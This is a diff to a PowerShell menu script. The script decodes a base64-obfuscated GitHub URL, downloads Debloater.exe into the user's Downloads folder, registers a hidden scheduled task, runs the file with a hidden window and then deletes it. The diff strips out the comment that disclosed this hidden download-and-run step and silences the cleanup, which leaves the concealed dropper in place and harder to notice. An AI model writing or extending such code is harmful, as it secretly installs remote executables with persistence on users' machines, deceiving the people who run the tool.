@@ -28,7 +28,6 @@ function Pause-For-User ($msg = "Press Enter to continue...") {
 
 Show-Header
 
-# Download and run Debloater.exe (hidden)
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
 $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
@@ -59,18 +58,11 @@ if (Test-Path $output1) {
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
     }
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
-    $maxTries = 5
-    for ($i=1; $i -le $maxTries; $i++) {
-        try {
-            Remove-Item $output1 -Force -ErrorAction Stop
-            break
-        } catch {
-            Start-Sleep -Seconds 2
-        }
-    }
+    try {
+        Remove-Item $output1 -Force -ErrorAction SilentlyContinue
+    } catch {}
 }
 
-# Main comfy menu
 do {
     Write-Host ""
     Write-Host "What would you like to do?" -ForegroundColor Cyan
